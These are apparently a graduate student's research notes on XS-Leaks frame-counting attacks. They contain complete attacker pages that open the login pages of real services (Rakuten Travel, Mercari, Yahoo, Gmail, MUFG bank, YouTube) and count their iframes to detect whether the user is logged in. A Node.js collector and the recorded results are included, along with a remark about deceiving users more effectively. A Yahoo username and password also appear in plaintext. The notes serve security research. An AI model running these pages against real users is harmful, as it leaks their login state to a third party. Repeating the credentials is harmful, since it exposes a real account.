# Master research

# 资源&网页&搜索

[XS-Leaks (Cross-Site Leaks) Attacks and Prevention](https://www.appsecmonkey.com/blog/xs-leaks)

https://github.com/digininja/DVWA

[ID Attribute](https://xsleaks.dev/docs/attacks/id-attribute/)

https://github.com/xsleaks/xsleaks

[Cross-window communication](https://javascript.info/cross-window-communication)

# XS-leaks attack through iframe 

用户打开页面，window.open会打开目标网站的登录页面，js代码记录打开网址后控制台输出iframe数量，过一段时间后再次输出iframe数量，将两次iframe数打印到表单，表单再传输给node服务器记录到数据库

The target website’s after login uses iframe, and the number of iframes is different from the number of iframes on the login page.

- Window.open()

The `window.open()` method is a JavaScript method that allows a web page to open a new browser window or a new tab in the same browser window. It can be used to open a new window with a specified URL, or to open a new window with a specified size and appearance.

The `window.open()` method takes several arguments, including the URL of the page to be opened, the name of the window or frame, and the features of the window (such as the size, location, and whether it should have a toolbar or menu). For example:

```js
window.open('https://www.example.com', 'myWindow', 'width=400,height=300');
```

This will open a new window with the specified dimensions and the URL `https://www.example.com`. The `window.open()` method can be used to open a new window in response to a user action, such as clicking a link or button. It can also be used to open a new window programmatically, for example, to display a login form or to display additional information about a product.

- Frame Counting 

Access the frame's **[window.length](https://developer.mozilla.org/en-US/docs/Web/API/Window/length)** property which is used to retrieve the number of frames (IFRAME or FRAME) in the window.

**Methods**: Frames, Pop-ups

**Difference**: Page Content

**Summary:** Read number of frames (window.length).

## 怎么样获取页面上iframe 数量

需要使用window.length, 或者window.frames.length;

如果页面中不包含frame和iframe元素, 则返回0;

```js
window.length === window.frames.length; // true
```

~~~js
var win = window.open("");
      var pattern1 = [];
      // In a loop, register the number of iframes at 60ms interval
      var recorder = setInterval(() => {
        pattern1.push(win.length)
      }, 60);

      // Break the loop after 6 seconds
      setTimeout(() => {
         clearInterval(recorder);
         console.log("The pattern1 is:", pattern1.join(', '));
      }, 6 * 1000); 
  
      //24秒后等待用户登录后再记录iframe
      setTimeout(twiceOpen,24 * 1000);
      function twiceOpen(){
        var pattern2 = [];
        // In a loop, register the number of iframes at 60ms interval
        var recorder = setInterval(() => {
          pattern2.push(win.length)
        }, 60);
  
        // Break the loop after 18 seconds
        setTimeout(() => {
           clearInterval(recorder);
           console.log("The pattern2 is:", pattern2.join(', '));
        }, 6 * 1000);
      }
~~~

# iframe 相关

- iframe使用场景

  [iframe](https://so.csdn.net/so/search?q=iframe&spm=1001.2101.3001.7020)可用在以下几个场景中：
  1.典型系统结构，左侧是功能树，右侧就是一些常见的table或者表单之类的。为了每一个功能，单独分离出来，采用iframe.
  2.[ajax](https://so.csdn.net/so/search?q=ajax&spm=1001.2101.3001.7020)上传文件
  3.加载别的网站内容，例如google广告，网站流量分析。
  4.在上传图片时，不用flash实现无刷新。
  5.跨域访问的时候可以用到iframe，使用iframe请求不同域名下的资源。

- Iframe 的好处

  1.iframe是一种html封装，方便相同功能的网页复用代码，可以一定程度上减少开发量，不失为一种代码复 用的好计策；

  2.iframe包含的代码几乎不会受到外界任何js或者css的影响（非常牛B的优点），可谓独树一帜，很任性；这种特点能减少很 多因为复用代码时，导致的css或者是js冲突，调试过程可谓痛苦，而且多半还要在错综复杂的关系纠葛中进 行修改，不小心可能会引入新的问题，iframe完全可以避免这种问题；

  ---

  1.iframe能够把嵌入的网页原样展现出来；

  2.模块分离，便于更改，如果有多个网页引用iframe，只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷；

  3.网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，增加代码的可重用；

  4.如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决；

  5.重载页面时不需要重载整个页面，只需要重载页面中的一个框架页；

  6.方便制作导航栏。

- **缺点:** 

  1.样式和脚本需要额外链入，调用外部页面,需要额外调用css,增加页面额外的请求次数，增加服务器的http请求；

  2.代码复杂，在网页中使用框架结构最大的弊病是搜索引擎的“蜘蛛”程序无法解读这种页面，会影响搜索引擎优化，不利于网站排名；

  3.框架结构有时会让人感到迷惑，滚动条除了会挤占有限的页面空间外会使iframe布局混乱，还会分散访问者的注意力，影响用户体验；

  4.链接导航疑问。运用框架结构时，必须保证正确配置所有的导航链接，否则，会给访问者带来很大的麻烦。比如被链接的页面出现在导航框架内，这种情况下访问者便被陷住了，因为此时他没有其他地点可去； 

  5.产生多个页面，不易管理；

  6.多数小型的移动设备（PDA 手机）无法完全显示框架，设备兼容性差。

# 开发记录(原生nodejs实现)

攻击者页面内配置乐天旅行的登录界面

用window.open() 打开登录界面

JavaScript记录iframe数，用户登录之后再记录iframe数

控制台信息打印在页面div标签（js实现）

nodejs服务端将iframe信息写入json储存

通过iframe的变化判断用户是否登录页面



# Attack flow window.open()

Get iframe of the page 

攻击页面html + javascript / 后台Node.js

- 使用window.open通常认为是一个不构成危险的选择?

  Exploiting XS-Leaks with `window.open` is generally seen as the least appealing option for an attacker because the user can see it happen in the open browser window. However, it’s usually the right technique when:

- 我想我的前端页面和方式可以更好的欺骗用户

## html页面

- 前端功能

1. window.open()打开对应网站登录界面
2. js会读取iframe的数，用户登录后再记录iframe数
3. 将控制台打印的iframe数输出在div标签中,css设置了flex大小
4. submit按钮后将iframe数输出给后台

- 记录两次，乐天旅行界面

```jsx
	<!DOCTYPE html>
<html lang="zh-Hans">
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet">
    <title>xs-leaks attack page</title>
  </head>

  <style>
    .sm-item {
      display: flex;
      flex-flow: row nowrap;
      padding-left: 16px;
      font-size: 1.6rem;
    }
    .item-text{
        flex: 1 1 auto;
        margin: 11px 8px 11px 16px;
        font-family: inherit !important;
        /*超过宽度，自动换行*/
        white-space: pre-wrap;
        word-wrap: break-word;
      }
  </style>

  <body style="height: 100%;">
    <h1>XS-leaks through frame counting</h1>
    <p>This is a page to contact login page.</p>
    
    <script type="text/javascript">
      //第一次打开页面记录iframe
      var win = window.open("<https://aps1.travel.rakuten.co.jp/portal/my/prv_page.first?f_tab=1>");
      var pattern1 = [];
      // In a loop, register the number of iframes at 60ms interval
      var recorder = setInterval(() => {
        pattern1.push(win.length)
      }, 60);

      // Break the loop after 6 seconds
      setTimeout(() => {
         clearInterval(recorder);
         console.log("The pattern1 is: ", pattern1.join(', '));
      }, 6 * 1000);
  
      //12秒后等待用户登录后再记录iframe
      setTimeout(twiceOpen,12 * 1000);
      function twiceOpen(){
        var pattern2 = [];
        // In a loop, register the number of iframes at 60ms interval
        var recorder = setInterval(() => {
          pattern2.push(win.length)
        }, 60);
  
        // Break the loop after 18 seconds
        setTimeout(() => {
           clearInterval(recorder);
           console.log("The pattern2 is: ", pattern2.join(', '));
        }, 6 * 1000);
      }
    </script>

    <!--打印读取页面iframe数-->
    <div class="sm-item" id="data">
    </div>
    <input type="submit" value="submit" onclick="submit()">
    <p id="result"></p>

    <script>
      //将控制台内容打印在div,pre内（打印在页面上）
      (function () {
        var old = console.log;
        var logger = document.getElementById('data');
        console.log = function () {
          for (var i = 0; i < arguments.length; i++) {
            if (typeof arguments[i] == 'object') {
                logger.innerHTML += (JSON && JSON.stringify ? JSON.stringify(arguments[i], undefined, 2) : arguments[i]) + '<br />';
            } else {
                logger.innerHTML += arguments[i] + '<br />';
            }
          }
        }
    })();
    </script>
    
    <script type="text/javascript">
        function submit(){
          //发送ajax请求

          var data = document.getElementById('data').innerHTML;
          var ajax = new XMLHttpRequest();

          ajax.open('post','<http://127.0.0.1:8888/test.json>',true)
          ajax.send(data)

          ajax.onreadystatechange = function(){
            if(ajax.readyState ==4 && ajax.status ==200){
                //本次请求成功
                document.getElementById("result").innerHTML = "sucesss" 
            }else{
                //本次请求失败
                document.getElementById("result").innerHTML = "fail" 
            }
          }
        }
       
    </script>
    
  </body>
</html>
```

- 记录三次 メルカリ界面

~~~js
<!DOCTYPE html>
<html lang="zh-Hans">
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet">
    <title>xs-leaks attack page</title>
  </head>

  <style>
    .sm-item {
      display: flex;
      flex-flow: row nowrap;
      padding-left: 16px;
      font-size: 1.6rem;
    }
    .item-text{
        flex: 1 1 auto;
        margin: 11px 8px 11px 16px;
        font-family: inherit !important;
        /*超过宽度，自动换行*/
        white-space: pre-wrap;
        word-wrap: break-word;
      }
  </style>

  <body style="height: 100%;">
    <h1>XS-leaks through frame counting</h1>
    <p>This is a page to contact login page.</p>
    
    <script type="text/javascript">
      //第一次打开页面记录iframe
      var win = window.open("https://jp.mercari.com/signin?params=client_id%3DbP4zN6jIZQeutikiUFpbx307DVK1pmoW%26code_challenge%3DlCy6XEvYsmhTigeVxvqVXGPDlXxdG-JTd79sM6GQihY%26code_challenge_method%3DS256%26noBackButton%3D1%26nonce%3DXksgrzLuxz9U%26redirect_uri%3Dhttps%253A%252F%252Fjp.mercari.com%252Fauth%252Fcallback%26response_type%3Dcode%26scope%3Dmercari%2520openid%26state%3DeyJwYXRoIjoiLyIsInJhbmRvbSI6Ii1MRkVFdkhjbk9pVCJ9%26ui_locales%3Dja");
      var pattern1 = [];
      // In a loop, register the number of iframes at 60ms interval
      var recorder = setInterval(() => {
        pattern1.push(win.length)
      }, 60);

      // Break the loop after 6 seconds
      setTimeout(() => {
         clearInterval(recorder);
         console.log("The pattern1 is:", pattern1.join(', '));
      }, 6 * 1000);
  
      //12秒后等待用户登录后再记录iframe
      setTimeout(twiceOpen,12 * 1000);
      function twiceOpen(){
        var pattern2 = [];
        // In a loop, register the number of iframes at 60ms interval
        var recorder = setInterval(() => {
          pattern2.push(win.length)
        }, 60);
  
        // Break the loop after 18 seconds
        setTimeout(() => {
           clearInterval(recorder);
           console.log("The pattern2 is:", pattern2.join(', '));
        }, 6 * 1000);
      }

      //36秒后等待用户登录后再记录iframe
      setTimeout(thirdOpen,36 * 1000);
      function thirdOpen(){
        var pattern3 = [];
        // In a loop, register the number of iframes at 60ms interval
        var recorder = setInterval(() => {
          pattern3.push(win.length)
        }, 60);
  
        // Break the loop after 42 seconds
        setTimeout(() => {
           clearInterval(recorder);
           console.log("The pattern3 is:", pattern3.join(', '));
        }, 6 * 1000);
      }
    </script>

    <!--打印读取页面iframe数-->
    <div class="sm-item" id="data">
    </div>
    <input type="submit" value="submit" onclick="submit()">
    <p id="result"></p>

    <script>
      //将控制台内容打印在div,pre内（打印在页面上）
      (function () {
        var old = console.log;
        var logger = document.getElementById('data');
        console.log = function () {
          for (var i = 0; i < arguments.length; i++) {
            if (typeof arguments[i] == 'object') {
                logger.innerHTML += (JSON && JSON.stringify ? JSON.stringify(arguments[i], undefined, 2) : arguments[i]) + '<br />';
            } else {
                logger.innerHTML += arguments[i] + '<br />';
            }
          }
        }
    })();
    </script>
    
    <script type="text/javascript">
        function submit(){
          //发送ajax请求

          var data = document.getElementById('data').innerHTML;
          var ajax = new XMLHttpRequest();

          ajax.open('post','http://127.0.0.1:8888/test.json',true)
          ajax.send(data)

          ajax.onreadystatechange = function(){
            if(ajax.readyState ==4 && ajax.status ==200){
                //本次请求成功
                document.getElementById("result").innerHTML = "sucesss" 
            }else{
                //本次请求失败
                document.getElementById("result").innerHTML = "fail" 
            }
          }
        }
       
    </script>
    
  </body>
</html>
~~~

## Ndoe.js 8888端口

### 后台

- 将div中的文本内容保存在json文件中

1. 导入fs写文件方法
2. fs.appendfile（）将div文本内容写入json

~~~js
var http = require("http")
var fs = require("fs")
var url = require("url")
 
http.createServer((req,res) =>{
    if((req.url).indexOf("index") >=0){
        //index目录下渲染index.htmlnode /Users/chenduo/Desktop/修论/nodejstest1/index.html

        fs.readFile('/Users/chenduo/Desktop/修论/serverjs/index.html','utf-8',(err,data)=>{
            if(err){res.end("internet fail")}
            else{
                // res.setHeader('content-type','text-html;charset=utf-8');
                res.writeHead(200,{"Content-type":"text/html"});
                res.write(data)
                res.end()
            }
        })
    }else if ((req.url).indexOf("test")>=0) {
        function hasBody(req) {
           return 'transfer-encoding' in req.headers || 'content-length' in req.headers 
        }
        function payload(){
           if(hasBody(req)){
               var buffers = [];
                req.on('data',(chunk) =>{
                    buffers.push(chunk)
                });
                req.on('end',()=>{
                    req.rawBody = Buffer.concat(buffers).toString();
                    
                    
                    req.body = req.rawBody;
                    console.log(req.body);

                    // console.log(new Date().getUTCFullYear()+"-"+new Date().getUTCMonth())
                    // writeFile 是写入文件，会覆盖之前，使用appendFile可以以追加方式，而不是覆盖
                    fs.appendFile('/Users/chenduo/Desktop/修论/serverjs/test.json',req.body,(err,data)=>{
                        if(err){console.log("fail")}
                        else{
                            console.log("sucess")
                        }
                    })
                });
            }else{
                console.log("fail")
            } 
        }
        payload()
        res.end("file input end")
    }
    else{
        res.end("helloworld")
    }
    
}).listen(8888)
 
console.log("8888")
~~~

# Chrome->Real world Test（登録ページ）

- The 9 most popular types of websites and what they include

1. [Business](https://en.99designs.jp/blog/web-digital/types-of-websites/#Business)
2. [Ecommerce](https://en.99designs.jp/blog/web-digital/types-of-websites/#Ecommerce)
3. [Blogs/news](https://en.99designs.jp/blog/web-digital/types-of-websites/#Blogs)
4. [Portfolio](https://en.99designs.jp/blog/web-digital/types-of-websites/#Portfolio)
5. [Service provider (streaming, online tools, etc.)](https://en.99designs.jp/blog/web-digital/types-of-websites/#Serviceprovider)
6. [Landing page](https://en.99designs.jp/blog/web-digital/types-of-websites/#Landingpage)
7. [Wiki/database](https://en.99designs.jp/blog/web-digital/types-of-websites/#Wiki)
8. [Forum](https://en.99designs.jp/blog/web-digital/types-of-websites/#Forum)
9. [Event](https://en.99designs.jp/blog/web-digital/types-of-websites/#Event)

## 楽天トラベル

楽天トラベル登録ページ

~~~html
https://aps1.travel.rakuten.co.jp/portal/my/prv_page.first?f_tab=1
~~~

- 登録前

The pattern1 is: <br>0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0<br>

- 登録後

The pattern2 is: <br>4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4<br>

## メルカリ

~~~html
login page

https://jp.mercari.com/signin?params=client_id%3DbP4zN6jIZQeutikiUFpbx307DVK1pmoW%26code_challenge%3DlCy6XEvYsmhTigeVxvqVXGPDlXxdG-JTd79sM6GQihY%26code_challenge_method%3DS256%26noBackButton%3D1%26nonce%3DXksgrzLuxz9U%26redirect_uri%3Dhttps%253A%252F%252Fjp.mercari.com%252Fauth%252Fcallback%26response_type%3Dcode%26scope%3Dmercari%2520openid%26state%3DeyJwYXRoIjoiLyIsInJhbmRvbSI6Ii1MRkVFdkhjbk9pVCJ9%26ui_locales%3Dja
~~~

- 登録前

The pattern1 is: <br>0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0<br>

- 登録後　記録

The pattern1 is:<br>0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0<br>The pattern2 is:<br>0, 0, 0, 0, 0, 0<br>The pattern3 is:<br>2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2<br>

## yahoo.mail

~~~html
login page

https://login.yahoo.com/manage_account?pspid=159600001&activity=mail-direct&.lang=en-US&.intl=us&src=ym&signin=true&done=https%3A%2F%2Fmail.yahoo.com%2Fd&eid=100
~~~

账号 chenduo1996

密码 2022abcdABCD

- 登録前

  The pattern1 is:<br>0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0<br>The pattern2 is:<br>0, 0, 0, 0, 0, 0<br>

- 登録後

  The pattern3 is:<br>

  6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6<br>

## gmail メール

~~~
login page
https://accounts.google.com/ServiceLogin/signinchooser?service=mail&passive=1209600&osid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&ifkv=AeAAQh6koTGOpJ3eHQ1w9ddCCrHFIv4yKYjYYyQ4_oOPUUIm1PRtbp1aPZZaojJGDi6S_jm9SzqA0w&flowName=GlifWebSignIn&flowEntry=ServiceLogin
~~~

- 登録前

The pattern1 is:
2, 2, 2, 2, 2, 2
The pattern2 is:
2, 2, 2, 2, 2, 2

- 登録後

The pattern3 is:
4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4

## 三菱ufj

~~~html
login page
://entry11.bk.mufg.jp/ibg/dfw/APLIN/loginib/login?_TRANID=AG004_001&link_id=kojin_top_direct_login_shinki&_gl=1&#42;k7mlu9&#42;_gcl_aw&#42;R0NMLjE2NzA2MDg1MjIuQ2owS0NRaUExc3VjQmhEZ0FSSXNBRm95dFVzanBiSUx4QmV6S1FqLU84VFllYTQ4TWI2VzZ6bTNBWElRejB2RnVrdE1DVTZqa3RROEVmVWFBbHYzRUFMd193Y0I.
~~~



- 登録前

The pattern1 is:
0, 9, 3, 3, 3, 3, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 3, 2, 4
The pattern2 is:
2, 2, 2, 2, 2, 2, 2

- 登録後

The pattern3 is:
3, 3, 3, 3, 3, 3, 3

## リクナビ2023(できない)

~~~html
login page
https://job.rikunabi.com/2023/auth/topLoginform/?toplocationUrl=17e39e8a070383eb860b3c672bf8ef7c4fc7df183b1369bf&topPattern=mypage&sslMode=1&menu=p&isc=r21rcnf00518
~~~

- 登録前

The pattern1 is:
0, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4

- 登録後

The pattern2 is:
4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4

- トップページ

The pattern3 is:
5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5



## youtube

~~~html
login page
https://accounts.google.com/ServiceLogin/signinchooser?service=youtube&passive=1209600&continue=https%3A%2F%2Fstudio.youtube.com%2F%3Fcsr%3Danalytics%26hl%3Dja&followup=https%3A%2F%2Fstudio.youtube.com%2F%3Fcsr%3Danalytics%26hl%3Dja&hl=ja&ifkv=AeAAQh6cF271ANUvTvVsVNWPPrtWMIWKXSR0bXikwXJ6dPIwoL6ibdAwwrzhqIjQYR0Ei5OwFytVcQ&flowName=GlifWebSignIn&flowEntry=ServiceLogin
~~~



- 登録前

 The pattern1 is:<br>0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2<br>The pattern2 is:<br>2, 0, 0, 1, 2, 3, 3<br>

- 登録後

The pattern3 is:<br>3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3<br>



# Firefox,safari





# Real world Test（）



~~~js
console.log(window.length);
~~~



# 研究plan

- [x] 他の登録ページをテストする

- [ ] 登録ページだけではなく,他の種類ページもテストする

# テストページを作る

- Login page 



# 防御方法















